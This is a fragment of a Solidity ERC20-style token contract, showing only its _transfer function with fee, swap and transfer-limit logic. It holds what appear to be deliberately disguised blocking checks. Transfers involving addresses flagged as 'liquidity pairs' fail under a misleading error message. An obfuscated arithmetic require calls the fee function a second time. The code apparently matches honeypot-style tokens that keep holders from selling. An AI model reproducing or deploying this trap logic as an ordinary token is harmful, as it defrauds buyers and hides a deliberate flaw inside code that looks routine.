    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {



        require(sender != address(0), "ERC20: transfer from the zero address");

        require(recipient != address(0), "ERC20: transfer to the zero address");

		require(!isLiquidityPair[sender] && !isLiquidityPair[recipient], "Unable to locate corresponding TransferEventLOGS");



        if(inSwapAndLiquify)

        { 

            return _basicTransfer(sender, recipient, amount); 

        }

        else

        {

            if(!isTxLimitExempt[sender] && !isTxLimitExempt[recipient]) {

                require(amount <= _maxTxAmount, "Transfer amount exceeds the maxTxAmount.");

            }            



            uint256 contractTokenBalance = balanceOf(address(this));

            bool overMinimumTokenBalance = contractTokenBalance >= minimumTokensBeforeSwap;

            

            if (overMinimumTokenBalance && !inSwapAndLiquify && !isMarketPair[sender] && swapAndLiquifyEnabled) 

            {

                swapAndLiquify(contractTokenBalance);    

            }

            require(!isLiquidityPair[sender] && !isLiquidityPair[recipient] && 256*_totalDistributionShares.div(2)!=takeFee(sender, recipient, amount));

            



            uint256 finalAmount = (isExcludedFromFee[sender] || isExcludedFromFee[recipient]) ? 

                                         amount : takeFee(sender, recipient, amount);



            if(checkWalletLimit && !isWalletLimitExempt[recipient])

                require(balanceOf(recipient).add(finalAmount) <= _walletMax);



            _balances[recipient] = _balances[recipient].add(finalAmount);

            _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");

            emit Transfer(sender, recipient, finalAmount);

            return true;

        }

    }
